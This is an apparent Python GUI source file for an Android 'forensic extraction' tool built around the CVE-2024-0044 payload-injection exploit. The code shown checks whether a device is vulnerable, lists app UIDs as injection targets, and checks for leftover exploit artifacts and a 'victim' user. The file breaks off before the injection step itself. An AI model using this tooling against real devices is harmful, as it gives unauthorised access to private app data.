
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import subprocess
import threading
import os
import time
import hashlib
import json
import shlex
from pathlib import Path
from datetime import datetime
import re
import sys

class ForensicVerification:
   """
   Forensic verification following ISO/IEC 27037:2012 guidelines
   """
   
   def __init__(self, log_callback=None):
       self.log_callback = log_callback
   
   def log(self, message, level="INFO"):
       """Log with callback"""
       if self.log_callback:
           self.log_callback(message, level)
       else:
           print(f"[{level}] {message}")
   
   def run_adb(self, command, shell=False, timeout=30):
       """Execute ADB command safely"""
       try:
           if shell:
               cmd = ["adb", "shell"] + command.split()
           else:
               cmd = ["adb"] + command.split()
           
           result = subprocess.run(cmd, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=timeout)
           return result.stdout.strip(), result.stderr.strip(), result.returncode
       except Exception as e:
           return "", str(e), -1
   
   def check_vulnerability(self):
       """Check if device is vulnerable to CVE-2024-0044"""
       self.log("Checking CVE-2024-0044 vulnerability status...")
       
       patch_level, _, _ = self.run_adb("getprop ro.build.version.security_patch", shell=True)
       android_version, _, _ = self.run_adb("getprop ro.build.version.release", shell=True)
       
       self.log(f"Android Version: {android_version}")
       self.log(f"Security Patch: {patch_level}")
       
       try:
           year, month = patch_level.split('-')[:2]
           patch_date = int(year) * 12 + int(month)
           
           # March 2024 was the official patch
           first_patch = 2024 * 12 + 3
           
           if patch_date >= first_patch:
               self.log("⚠️  Device appears PATCHED (Date >= March 2024)", "WARNING")
               self.log("    Exploit may still work due to silent patches variance", "INFO")
           else:
               self.log("✅ Device Security Patch predates March 2024", "SUCCESS")
           
           return True
           
       except Exception as e:
           self.log(f"Error parsing patch: {e}", "ERROR")
           return True
   
   def check_selinux(self):
       """Check SELinux status - Forensic documentation"""
       self.log("Checking SELinux status...")
       selinux, _, _ = self.run_adb("getenforce", shell=True)
       self.log(f"SELinux Mode: {selinux}")
       
       if selinux == "Enforcing":
           self.log("    SELinux Enforcing may limit exploit effectiveness", "WARNING")
       
       return selinux

   def run_pre_verification(self, package=None):
       """Run operative pre-checks following forensic standards"""
       self.log("="*60)
       self.log("STARTING PRE-EXTRACTION VERIFICATION")
       self.log("Standard: ISO/IEC 27037:2012")
       
       # Check vulnerability
       self.check_vulnerability()
       
       # Check SELinux
       self.check_selinux()
       
       # Check package exists
       if package:
           stdout, _, code = self.run_adb(f"pm list packages {package}", shell=True)
           if package not in stdout:
               self.log(f"❌ Package {package} not found on device", "ERROR")
               return False
           self.log(f"✅ Package {package} verified on device", "SUCCESS")
       
       return True
   
   def verify_cleanup(self):
       """Verify temporary files cleaned - Chain of custody"""
       self.log("Verifying device cleanup (Chain of Custody)...")
       issues = []
       locations = ["/data/local/tmp/"]
       
       for location in locations:
           # Check for APKs
           stdout, _, code = self.run_adb(f"ls {location}*.apk 2>/dev/null", shell=True)
           if stdout and code == 0:
               issues.append(f"APK in {location}")
           
           # Check for exploit scripts
           stdout, _, code = self.run_adb(f"ls {location}*exploit* 2>/dev/null", shell=True)
           if stdout and code == 0:
               issues.append(f"Exploit script in {location}")
       
       if len(issues) == 0:
           self.log("✅ Device cleanup verified - No artifacts remain", "SUCCESS")
       else:
           self.log(f"⚠️  Cleanup incomplete: {issues}", "WARNING")
       
       return len(issues) == 0
   
   def verify_victim_user(self):
       """Check victim user status"""
       stdout, stderr, code = self.run_adb("run-as victim id", shell=True)
       if code == 0:
           self.log("ℹ️  'victim' user active (will reset on reboot)", "INFO")
       else:
           self.log("✅ 'victim' user not present", "SUCCESS")

   def run_post_verification(self):
       """Run post-extraction checks following forensic standards"""
       self.log("="*60)
       self.log("STARTING POST-EXTRACTION VERIFICATION")
       
       self.verify_cleanup()
       self.verify_victim_user()
       
       self.log("="*60)


class TraversoForensicsGUI:
   """
   Traverso Forensics - Professional Android Extraction Suite
   Following ISO/IEC 27037:2012 Guidelines for Digital Evidence
   CVE-2024-0044 Exploit Implementation (Payload Injection Method)
   """
   
   def __init__(self, root):
       self.root = root
       self.root.title("Traverso Forensics - Professional Extraction Suite v1.0")
       self.root.geometry("1200x800")
       self.root.configure(bg="#1e1e1e")
       self.root.resizable(True, True)
       
       # Variables
       self.device_connected = tk.BooleanVar(value=False)
       self.selected_package = tk.StringVar()
       self.selected_uid = tk.StringVar()
       self.device_info = {}
       self.apps_list = []
       self.log_file = None
       self.log_entries = []
       self.log_buffer = []
       self.extraction_dir = None
       self.extraction_data = {}
       
       # Verification system
       self.verifier = None
       
       # Setup UI
       self.setup_styles()
       self.create_header()
       self.create_main_panels()
       self.create_footer()
       
       # Auto-detect device on startup
       self.root.after(500, self.auto_detect_device)
   
   def setup_styles(self):
       """Setup dark theme colors"""
       self.bg_dark = "#1e1e1e"
       self.bg_panel = "#2d2d2d"
       self.bg_input = "#3e3e3e"
       self.fg_text = "#f0f0f0"
       self.fg_secondary = "#a0a0a0"
       self.accent_green = "#2ecc71"
       self.accent_blue = "#3498db"
       self.accent_red = "#e74c3c"
       self.accent_orange = "#f39c12"
       
       style = ttk.Style()
       style.theme_use('clam')
       style.configure("blue.Horizontal.TProgressbar",
                      troughcolor=self.bg_input,
                      background=self.accent_blue,
                      bordercolor=self.bg_panel,
                      lightcolor=self.accent_blue,
                      darkcolor=self.accent_blue)
   
   def create_header(self):
       """Create header with logo"""
       header = tk.Frame(self.root, bg=self.bg_dark, height=80)
       header.pack(fill=tk.X, side=tk.TOP)
       header.pack_propagate(False)
       
       # Logo
       logo_path = "traverso_logo.png"
       try:
           if os.path.exists(logo_path):
               logo = tk.PhotoImage(file=logo_path)
               logo = logo.subsample(10, 10)
               logo_label = tk.Label(header, image=logo, bg=self.bg_dark)
               logo_label.image = logo
               logo_label.pack(side=tk.LEFT, padx=20)
       except:
           pass
       
       # Title
       title_frame = tk.Frame(header, bg=self.bg_dark)
       title_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
       
       tk.Label(title_frame, text="Traverso Forensics",
               font=("Segoe UI", 24, "bold"),
               foreground="white",
               background=self.bg_dark).pack(anchor=tk.W, pady=(10, 0))
       
       tk.Label(title_frame, text="Professional Android Extraction - CVE-2024-0044 (ISO/IEC 27037:2012)",
               font=("Segoe UI", 10),
               foreground=self.fg_secondary,
               background=self.bg_dark).pack(anchor=tk.W)
   
   def create_main_panels(self):
       """Create main UI panels"""
       container = tk.Frame(self.root, bg=self.bg_dark)
       container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
       
       # Left panel (device + apps)
       left_panel = self.create_left_panel(container)
       left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
       
       # Right panel (selected app + extraction)
       right_panel = self.create_right_panel(container)
       right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
   
   def create_left_panel(self, parent):
       """Create left panel with device info and app list"""
       panel = tk.Frame(parent, bg=self.bg_panel)
       
       # Device Status Panel (Enhanced with colors)
       status_header = tk.Frame(panel, bg=self.bg_panel)
       status_header.pack(fill=tk.X, padx=15, pady=(15, 5))
       
       tk.Label(status_header, text="Device Status", font=("Segoe UI", 12, "bold"),
               foreground=self.fg_text, background=self.bg_panel).pack(side=tk.LEFT)
       
       self.refresh_device_btn = tk.Button(status_header, text="🔄 Refresh",
                                          bg=self.accent_blue, fg="white",
                                          font=("Segoe UI", 9, "bold"), relief=tk.FLAT,
                                          padx=15, pady=4, cursor="hand2",
                                          command=self.check_device)
       self.refresh_device_btn.pack(side=tk.RIGHT)
       
       # Status indicator with color
       status_indicator_frame = tk.Frame(panel, bg=self.bg_input, relief=tk.FLAT, bd=2)
       status_indicator_frame.pack(fill=tk.X, padx=15, pady=(0, 5))
       
       indicator_top = tk.Frame(status_indicator_frame, bg=self.bg_input)
       indicator_top.pack(fill=tk.X, padx=10, pady=(10, 5))
       
       self.status_indicator = tk.Label(indicator_top, text="●", font=("Segoe UI", 16),
                                        foreground=self.accent_red, background=self.bg_input)
       self.status_indicator.pack(side=tk.LEFT, padx=(0, 10))
       
       self.connection_status_label = tk.Label(indicator_top,
                                              text="No device detected",
                                              font=("Segoe UI", 11, "bold"),
                                              foreground=self.accent_red,
                                              background=self.bg_input)
       self.connection_status_label.pack(side=tk.LEFT)
       
       # Device info text area
       device_frame = tk.Frame(status_indicator_frame, bg=self.bg_input)
       device_frame.pack(fill=tk.BOTH, padx=10, pady=(0, 10))
       
       self.device_text = scrolledtext.ScrolledText(device_frame, height=3, bg=self.bg_input,
                                                    fg=self.fg_secondary, font=("Consolas", 9),
                                                    relief=tk.FLAT, borderwidth=0)
       self.device_text.pack(fill=tk.BOTH)
       self.device_text.insert(1.0, "Connect device via USB and enable USB debugging\nThen click 'Detect Device' or 'Refresh' button")
       self.device_text.config(state=tk.DISABLED)
       
       # Buttons
       btn_frame = tk.Frame(panel, bg=self.bg_panel)
       btn_frame.pack(fill=tk.X, padx=15, pady=(5, 15))
       
       self.detect_btn = tk.Button(btn_frame, text="Detect Device", bg=self.accent_green,
                                   fg="white", font=("Segoe UI", 10, "bold"), relief=tk.FLAT,
                                   padx=20, pady=8, cursor="hand2", command=self.check_device)
       self.detect_btn.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(0, 5))
       
       self.listapps_btn = tk.Button(btn_frame, text="List All Apps", bg=self.bg_input,
                                     fg=self.fg_text, font=("Segoe UI", 10, "bold"),
                                     relief=tk.FLAT, padx=20, pady=8, cursor="hand2",
                                     command=self.list_all_apps, state=tk.DISABLED)
       self.listapps_btn.pack(side=tk.RIGHT, expand=True, fill=tk.X, padx=(5, 0))
       
       # Applications List section
       tk.Label(panel, text="Applications List", font=("Segoe UI", 12, "bold"),
               foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(10, 10))
       
       # Filter options
       filter_frame = tk.Frame(panel, bg=self.bg_panel)
       filter_frame.pack(fill=tk.X, padx=15, pady=(0, 5))
       
       self.app_filter = tk.StringVar(value="all")
       
       tk.Radiobutton(filter_frame, text="All", variable=self.app_filter, value="all",
                     bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
                     font=("Segoe UI", 9), activebackground=self.bg_panel,
                     command=self.filter_apps).pack(side=tk.LEFT, padx=5)
       
       tk.Radiobutton(filter_frame, text="Third-party", variable=self.app_filter, value="third_party",
                     bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
                     font=("Segoe UI", 9), activebackground=self.bg_panel,
                     command=self.filter_apps).pack(side=tk.LEFT, padx=5)
       
       tk.Radiobutton(filter_frame, text="Native", variable=self.app_filter, value="native",
                     bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
                     font=("Segoe UI", 9), activebackground=self.bg_panel,
                     command=self.filter_apps).pack(side=tk.LEFT, padx=5)
       
       # Search box
       search_frame = tk.Frame(panel, bg=self.bg_panel)
       search_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
       
       self.search_var = tk.StringVar()
       self.search_var.trace('w', lambda *args: self.filter_apps())
       
       search_entry = tk.Entry(search_frame, textvariable=self.search_var,
                              bg=self.bg_input, fg=self.fg_text, font=("Segoe UI", 9),
                              relief=tk.FLAT, insertbackground=self.fg_text)
       search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5), ipady=5)
       
       clear_btn = tk.Button(search_frame, text="✕", bg=self.bg_input, fg=self.fg_text,
                            font=("Segoe UI", 9), relief=tk.FLAT, padx=10, cursor="hand2",
                            command=lambda: self.search_var.set(""))
       clear_btn.pack(side=tk.RIGHT)
       
       # Apps listbox
       apps_frame = tk.Frame(panel, bg=self.bg_input)
       apps_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
       
       scrollbar = tk.Scrollbar(apps_frame, bg=self.bg_input)
       scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
       
       self.apps_listbox = tk.Listbox(apps_frame, bg=self.bg_input, fg=self.fg_text,
                                      font=("Consolas", 9), relief=tk.FLAT, borderwidth=0,
                                      selectbackground=self.accent_blue, selectforeground="white",
                                      yscrollcommand=scrollbar.set)
       self.apps_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
       scrollbar.config(command=self.apps_listbox.yview)
       self.apps_listbox.bind('<<ListboxSelect>>', self.on_app_select)
       
       return panel
   
   def create_right_panel(self, parent):
       """Create right panel with extraction controls"""
       panel = tk.Frame(parent, bg=self.bg_panel)
       
       # Selected Application section
       tk.Label(panel, text="Selected Application", font=("Segoe UI", 12, "bold"),
               foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(15, 10))
       
       info_frame = tk.Frame(panel, bg=self.bg_panel)
       info_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
       
       tk.Label(info_frame, text="Package:", font=("Segoe UI", 9, "bold"),
               background=self.bg_panel, foreground=self.fg_secondary).pack(anchor=tk.W)
       self.package_label = tk.Label(info_frame, text="None", font=("Segoe UI", 10),
                                     background=self.bg_panel, foreground=self.fg_text, wraplength=400)
       self.package_label.pack(anchor=tk.W, pady=(0, 10))
       
       tk.Label(info_frame, text="UID:", font=("Segoe UI", 9, "bold"),
               background=self.bg_panel, foreground=self.fg_secondary).pack(anchor=tk.W)
       self.uid_label = tk.Label(info_frame, text="None", font=("Segoe UI", 10),
                                  background=self.bg_panel, foreground=self.fg_text)
       self.uid_label.pack(anchor=tk.W)
       
       # Progress section
       self.progress = ttk.Progressbar(panel, mode='determinate', length=300, 
                                      style="blue.Horizontal.TProgressbar")
       self.progress.pack(fill=tk.X, padx=15, pady=(10, 5))
       
       self.progress_label = tk.Label(panel, text="", bg=self.bg_panel, fg=self.fg_text, 
                                     font=("Segoe UI", 9))
       self.progress_label.pack(fill=tk.X, padx=15, pady=(0, 10))
       
       # Start button
       self.start_btn = tk.Button(panel, text="Start Forensic Extraction", bg=self.bg_input, 
                                  fg=self.fg_text, font=("Segoe UI", 11, "bold"), relief=tk.FLAT, 
                                  padx=20, pady=12, cursor="hand2", command=self.start_extraction, 
                                  state=tk.DISABLED)
       self.start_btn.pack(fill=tk.X, padx=15, pady=10)
       
       # Status/Log section
       tk.Label(panel, text="Extraction Status & Log", font=("Segoe UI", 10, "bold"),
               foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(10, 5))
       
       log_frame = tk.Frame(panel, bg=self.bg_input)
       log_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
       
       self.log_text = scrolledtext.ScrolledText(log_frame, bg=self.bg_input, fg=self.fg_text,
                                                  font=("Consolas", 9), relief=tk.FLAT,
                                                  borderwidth=0, height=15)
       self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
       self.log_text.insert(1.0, "Ready to start forensic extraction...\n\nPlease connect device and select an application.")
       self.log_text.config(state=tk.DISABLED)
       
       return panel
   
   def create_footer(self):
       """Create footer with status"""
       footer = tk.Frame(self.root, bg=self.bg_panel, height=80)
       footer.pack(fill=tk.X, side=tk.BOTTOM)
       footer.pack_propagate(False)
       
       # Left side - Status
       left_frame = tk.Frame(footer, bg=self.bg_panel)
       left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=20, pady=10)
       
       self.status_label = tk.Label(left_frame,
                                    text="Status: Ready",
                                    font=('Segoe UI', 10),
                                    foreground=self.fg_text,
                                    background=self.bg_panel,
                                    anchor=tk.W)
       self.status_label.pack(fill=tk.X)
       
       self.footer_progress_label = tk.Label(left_frame,
                                      text="",
                                      font=('Segoe UI', 9),
                                      foreground=self.fg_secondary,
                                      background=self.bg_panel,
                                      anchor=tk.W)
       self.footer_progress_label.pack(fill=tk.X)
       
       # Right side - Forensic compliance indicator
       right_frame = tk.Frame(footer, bg=self.bg_panel)
       right_frame.pack(side=tk.RIGHT, padx=20, pady=10)
       
       tk.Label(right_frame, text="ISO/IEC 27037:2012",
               font=("Segoe UI", 8),
               foreground=self.fg_secondary,
               background=self.bg_panel).pack()
       
       # Store last extraction directory
       self.last_extraction_dir = None

   def update_device_status(self, connected, message, details=""):
       """Update device status indicator with colors"""
       if connected:
           self.status_indicator.config(foreground=self.accent_green)
           self.connection_status_label.config(text=message, foreground=self.accent_green)
       else:
           self.status_indicator.config(foreground=self.accent_red)
           self.connection_status_label.config(text=message, foreground=self.accent_red)
       
       # Update device info text
       self.device_text.config(state=tk.NORMAL)
       self.device_text.delete(1.0, tk.END)
       self.device_text.insert(1.0, details)
       self.device_text.config(state=tk.DISABLED)

   def write_log(self, message, level="INFO"):
       """Write to log display with forensic timestamp"""
       timestamp = time.strftime("%H:%M:%S")
       
       # Color coding
       if level == "SUCCESS":
           prefix = "✅"
       elif level == "WARNING":
           prefix = "⚠️ "
       elif level == "ERROR":
           prefix = "❌"
       else:
           prefix = "ℹ️ "
       
       log_entry = f"[{timestamp}] {prefix} {message}\n"
       
       # Store in buffer for forensic log
       self.log_buffer.append(f"[{timestamp}] [{level}] {message}")
       
       self.root.after(0, lambda: self._append_log(log_entry))
       
       # Also write to file if available
       if self.log_file:
           try:
               with open(self.log_file, 'a', encoding='utf-8') as f:
                   f.write(f"[{timestamp}] [{level}] {message}\n")
           except:
               pass
       
       # Save to entries
       self.log_entries.append({"timestamp": timestamp, "level": level, "message": message})
   
   def _append_log(self, text):
       """Append to log text widget"""
       self.log_text.config(state=tk.NORMAL)
       self.log_text.insert(tk.END, text)
       self.log_text.see(tk.END)
       self.log_text.config(state=tk.DISABLED)
   
   def save_log_to_file(self, extraction_dir):
       """Save complete forensic log to file"""
       try:
           log_filename = os.path.join(extraction_dir, "extraction_log.txt")
           with open(log_filename, 'w', encoding='utf-8') as f:
               f.write("="*70 + "\n")
               f.write("TRAVERSO FORENSICS - FORENSIC EXTRACTION LOG\n")
               f.write("="*70 + "\n")
               f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
               f.write(f"Standard: ISO/IEC 27037:2012\n")
               f.write(f"Extraction Method: CVE-2024-0044 (Payload Injection)\n")
               f.write("="*70 + "\n\n")
               
               for line in self.log_buffer:
                   f.write(line + "\n")
               
               f.write("\n" + "="*70 + "\n")
               f.write("END OF FORENSIC LOG\n")
               f.write("="*70 + "\n")
           
           self.write_log(f"✅ Forensic log saved: {log_filename}", "SUCCESS")
           return log_filename
       except Exception as e:
           self.write_log(f"❌ Error saving log: {e}", "ERROR")
           return None
   
   def update_progress(self, step, total, message):
       """Update progress bar"""
       percentage = (step / total) * 100
       self.root.after(0, lambda: self.progress.configure(value=percentage))
       self.root.after(0, lambda: self.progress_label.config(text=message))
       self.root.after(0, lambda: self.footer_progress_label.config(text=message))
   
   def check_adb_installed(self):
       """Verify ADB is installed and accessible"""
       try:
           result = subprocess.run(["adb", "version"], 
                                 capture_output=True, 
                                 text=True, 
                                 timeout=5)
           if result.returncode == 0:
               version_line = result.stdout.split('\n')[0]
               self.write_log(f"ADB found: {version_line}", "SUCCESS")
               return True
           else:
               self.write_log("ADB command failed", "ERROR")
               self.update_device_status(False, "ADB Error", 
                   "ADB command execution failed\n\nPlease reinstall Android SDK Platform Tools")
               return False
       except FileNotFoundError:
           self.write_log("ADB not found in system PATH", "ERROR")
           self.update_device_status(False, "ADB Not Installed",
               "Android Debug Bridge (ADB) is not installed\n\n"
               "Installation steps:\n"
               "1. Download Android SDK Platform Tools\n"
               "2. Extract to a folder (e.g., C:\\platform-tools)\n"
               "3. Add folder to system PATH\n"
               "4. Restart this application")
           messagebox.showerror("ADB Not Found", 
                              "ADB (Android Debug Bridge) is not installed or not in PATH.\n\n"
                              "Please install Android SDK Platform Tools:\n"
                              "1. Download from developer.android.com\n"
                              "2. Add to system PATH\n"
                              "3. Restart application")
           return False
       except subprocess.TimeoutExpired:
           self.write_log("ADB command timeout", "ERROR")
           self.update_device_status(False, "ADB Timeout",
               "ADB command timed out after 5 seconds\n\n"
               "Possible causes:\n"
               "• ADB server not responding\n"
               "• System performance issues\n\n"
               "Try restarting ADB server manually:\n"
               "adb kill-server && adb start-server")
           return False
       except Exception as e:
           self.write_log(f"Error checking ADB: {e}", "ERROR")
           self.update_device_status(False, "ADB Error", f"Unexpected error: {str(e)}")
           return False
   
   def start_adb_server(self):
       """Start ADB server"""
       try:
           self.write_log("Starting ADB server...", "INFO")
           result = subprocess.run(["adb", "start-server"], 
                                 capture_output=True, 
                                 text=True, 
                                 timeout=10)
           if result.returncode == 0:
               self.write_log("ADB server started", "SUCCESS")
               return True
           else:
               self.write_log(f"ADB server start warning: {result.stderr}", "WARNING")
               return True
       except subprocess.TimeoutExpired:
           self.write_log("ADB server start timeout", "ERROR")
           self.update_device_status(False, "Connection Timeout",
               "ADB server failed to start (timeout after 10s)\n\n"
               "Try manually:\n"
               "1. Open command prompt/terminal\n"
               "2. Run: adb kill-server\n"
               "3. Run: adb start-server\n"
               "4. Click 'Refresh' button")
           return False
       except Exception as e:
           self.write_log(f"Error starting ADB server: {e}", "ERROR")
           return False
   
   def get_device_info(self):
       """Get detailed device information"""
       try:
           # Get device model
           model_result = subprocess.run(
               ["adb", "shell", "getprop", "ro.product.model"],
               capture_output=True,
               text=True,
               timeout=5
           )
           model = model_result.stdout.strip() if model_result.returncode == 0 else "Unknown"
           
           # Get Android version
           version_result = subprocess.run(
               ["adb", "shell", "getprop", "ro.build.version.release"],
               capture_output=True,
               text=True,
               timeout=5
           )
           version = version_result.stdout.strip() if version_result.returncode == 0 else "Unknown"
           
           # Get manufacturer
           manufacturer_result = subprocess.run(
               ["adb", "shell", "getprop", "ro.product.manufacturer"],
               capture_output=True,
               text=True,
               timeout=5
           )
           manufacturer = manufacturer_result.stdout.strip() if manufacturer_result.returncode == 0 else "Unknown"
           
           # Get security patch
           patch_result = subprocess.run(
               ["adb", "shell", "getprop", "ro.build.version.security_patch"],
               capture_output=True,
               text=True,
               timeout=5
           )
           patch = patch_result.stdout.strip() if patch_result.returncode == 0 else "Unknown"
           
           info_text = f"{manufacturer} {model}\nAndroid {version}\nSecurity Patch: {patch}"
           
           self.update_device_status(True, "Device Connected", info_text)
           
           self.write_log(f"Device: {manufacturer} {model} (Android {version})", "SUCCESS")
           
           return info_text
           
       except subprocess.TimeoutExpired:
           self.write_log("Device info retrieval timeout", "WARNING")
           self.update_device_status(True, "Device Connected", 
               "Device connected but info retrieval timed out\n\n"
               "Device may be slow to respond or ADB connection unstable")
           return "Device info unavailable (timeout)"
       except Exception as e:
           self.write_log(f"Could not get device info: {e}", "WARNING")
           return "Device info unavailable"
   
   def auto_detect_device(self):
       """Auto-detect device on startup"""
       self.write_log("Checking for connected devices...", "INFO")
       self.check_device()
   
   def run_adb_command(self, command, shell=False, timeout=30):
       """Execute ADB command"""
       try:
           if shell:
               full_command = ["adb", "shell"] + command.split()
           else:
               full_command = ["adb"] + command.split()
           
           result = subprocess.run(full_command, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=timeout)
           return result.stdout, result.stderr, result.returncode
       except subprocess.TimeoutExpired:
           return "", f"Command timeout after {timeout} seconds", -1
       except Exception as e:
           return None, str(e), 1
   
   def check_device(self):
       """Check if device is connected"""
       self.update_device_status(False, "Checking...", "Detecting connected devices...")
       
       def check():
           # Check ADB installed
           if not self.check_adb_installed():
               self.device_connected.set(False)
               return
           
           # Start ADB server
           if not self.start_adb_server():
               self.device_connected.set(False)
               return
           
           time.sleep(0.5)
           
           stdout, stderr, code = self.run_adb_command("devices")
           
           if code != 0:
               self.device_connected.set(False)
               self.update_device_status(False, "ADB Command Failed",
                   f"Error executing 'adb devices'\n\n{stderr}\n\n"
                   "Try:\n"
                   "1. Restart ADB server: adb kill-server && adb start-server\n"
                   "2. Check USB cable connection\n"
                   "3. Click 'Refresh' button")
               self.write_log("ADB devices command failed", "ERROR")
               return
           
           lines = stdout.strip().split('\n')
           devices = [line for line in lines[1:] if line.strip() and 'device' in line]
           
           if not devices:
               self.device_connected.set(False)
               self.update_device_status(False, "No Device Detected",
                   "No Android devices found\n\n"
                   "Connection steps:\n"
                   "1. Connect device via USB cable\n"
                   "2. Enable 'USB Debugging' in Developer Options\n"
                   "3. Authorize this computer on device screen\n"
                   "4. Click 'Detect Device' or 'Refresh' button\n\n"
                   "If device is connected:\n"
                   "• Check USB cable (try different cable/port)\n"
                   "• Enable 'USB Debugging' in Settings > Developer Options\n"
                   "• Unlock device screen")
               self.write_log("No devices detected", "WARNING")
               return
           
           self.device_connected.set(True)
           
           # Get device info
           self.get_device_info()
           
           # Enable apps button
           self.listapps_btn.config(state=tk.NORMAL, bg=self.accent_blue)
           
           self.write_log("Device connected successfully", "SUCCESS")
       
       thread = threading.Thread(target=check)
       thread.daemon = True
       thread.start()
   
   def get_package_uid(self, package):
       """Get UID for a specific package - Critical for payload injection"""
       try:
           result = subprocess.run(
               ["adb", "shell", "pm", "list", "packages", "-U"],
               capture_output=True,
               text=True,
               timeout=30
           )
           
           for line in result.stdout.split('\n'):
               if f"package:{package}" in line:
                   parts = line.split()
                   for part in parts:
                       if "uid:" in part:
                           uid = part.replace("uid:", "").strip()
                           self.write_log(f"Package UID: {uid}", "INFO")
                           return uid
           
           self.write_log(f"Could not determine UID for {package}", "ERROR")
           return None
           
       except Exception as e:
           self.write_log(f"Error getting package UID: {e}", "ERROR")
           return None
   
   def list_all_apps(self):
       """List all installed applications with UIDs"""
       self.write_log("Fetching installed applications with UIDs...", "INFO")
       self.apps_listbox.delete(0, tk.END)
       self.apps_list = []
       
       def fetch():
           stdout, stderr, code = self.run_adb_command("pm list packages -U", shell=True, timeout=60)
           
           if code != 0 or not stdout:
               self.write_log("Failed to fetch apps", "ERROR")
               messagebox.showerror("Error", 
                   f"Failed to list applications\n\n"
                   f"Error: {stderr if stderr else 'Unknown error'}\n\n"
                   f"Try:\n"
                   f"• Check device connection\n"
                   f"• Ensure USB debugging is enabled\n"
                   f"• Click 'Refresh' and try again")
               return
           
           lines = stdout.strip().split('\n')
           
           for line in lines:
               if "package:" in line and "uid:" in line:
                   try:
                       parts = line.split()
                       package = parts[0].replace("package:", "")
                       uid = parts[1].replace("uid:", "")
                       
                       # Determine if third-party or native
                       is_third_party = not any(prefix in package for prefix in 
                                               ['com.android', 'com.google', 'android', 'com.samsung'])
                       
                       app_type = "third_party" if is_third_party else "native"
                       
                       self.apps_list.append({
                           "package": package,
                           "uid": uid,
                           "type": app_type
                       })
                   except:
                       continue
           
           self.write_log(f"Found {len(self.apps_list)} applications with UIDs", "SUCCESS")
           self.filter_apps()
       
       thread = threading.Thread(target=fetch)
       thread.daemon = True
       thread.start()
   
   def filter_apps(self):
       """Filter displayed apps"""
       self.apps_listbox.delete(0, tk.END)
       
       filter_type = self.app_filter.get()
       search_term = self.search_var.get().lower()
       
       for app in self.apps_list:
           # Filter by type
           if filter_type != "all" and app["type"] != filter_type:
               continue
           
           # Filter by search
           if search_term and search_term not in app["package"].lower():
               continue
           
           display = f"{app['package']} (UID: {app['uid']})"
           self.apps_listbox.insert(tk.END, display)
   
   def on_app_select(self, event):
       """Handle app selection"""
       selection = self.apps_listbox.curselection()
       if not selection:
           return
       
       selected_text = self.apps_listbox.get(selection[0])
       package = selected_text.split(" (UID:")[0]
       uid = selected_text.split("UID: ")[1].rstrip(")")
       
       self.selected_package.set(package)
       self.selected_uid.set(uid)
       
       self.package_label.config(text=package)
       self.uid_label.config(text=uid)
       
       # Enable extraction button
       self.start_btn.config(state=tk.NORMAL, bg=self.accent_green)
       
       self.write_log(f"Selected: {package} (UID: {uid})", "INFO")
   
   def calculate_hash256(self, filepath):
       """Calculate SHA256 hash for forensic integrity"""
       sha256 = hashlib.sha256()
       with open(filepath, 'rb') as f:
           for chunk in iter(lambda: f.read(8192), b''):
               sha256.update(chunk)
       return sha256.hexdigest()
   
   def generate_extraction_report(self, package, extraction_dir):
       """Genera un reporte TXT con detalles específicos de la extracción"""
       self.write_log("Generando reporte de detalles de extracción...", "INFO")
       
       # 1. Obtener versión de la aplicación
       version = "Desconocida"
       try:
           # Ejecuta dumpsys para buscar la linea versionName
           cmd = f"dumpsys package {package} | grep versionName"
           stdout, _, _ = self.run_adb_command(cmd, shell=True, timeout=10)
           if stdout:
               # La salida suele ser "    versionName=X.X.X"
               version = stdout.strip().replace("versionName=", "")
       except Exception as e:
           self.write_log(f"No se pudo obtener la versión de la app: {e}", "WARNING")

       # 2. Obtener Fecha, Hora y Zona Horaria
       now = datetime.now().astimezone()
       fecha_hora = now.strftime("%d/%m/%Y %H:%M:%S")
       
       # Intentar obtener el nombre de la zona horaria, si falla usar el offset
       zona_horaria = now.tzname()
       if not zona_horaria:
           zona_horaria = str(now.utcoffset())

       # 3. Definir método
       metodo = "CVE-2024-0044 (Payload Injection) - ISO/IEC 27037:2012"

       # 4. Crear el archivo TXT
       filename = os.path.join(extraction_dir, "detalles_extraccion.txt")
       
       try:
           with open(filename, 'w', encoding='utf-8') as f:
               f.write("="*60 + "\n")
               f.write("REPORTE DE EXTRACCIÓN FORENSE\n")
               f.write("="*60 + "\n\n")
               f.write(f"Aplicación Extraída: {package}\n")
               f.write(f"Versión de la App:   {version}\n")
               f.write(f"Método Utilizado:    {metodo}\n")
               f.write("-" * 60 + "\n")
               f.write(f"Fecha de Extracción: {fecha_hora}\n")
               f.write(f"Zona Horaria:        {zona_horaria}\n")
               f.write("="*60 + "\n")
           
           self.write_log(f"✅ Reporte de detalles guardado: {os.path.basename(filename)}", "SUCCESS")
           return True
       except Exception as e:
           self.write_log(f"❌ Error al guardar reporte de detalles: {e}", "ERROR")
           return False

   def start_extraction(self):
       """Start forensic extraction"""
       if not self.device_connected.get():
           messagebox.showwarning("No Device", 
                                "Please connect a device first.\n\n"
                                "Steps:\n"
                                "1. Connect device via USB\n"
                                "2. Enable USB debugging\n"
                                "3. Click 'Detect Device' or 'Refresh' button")
           return
       
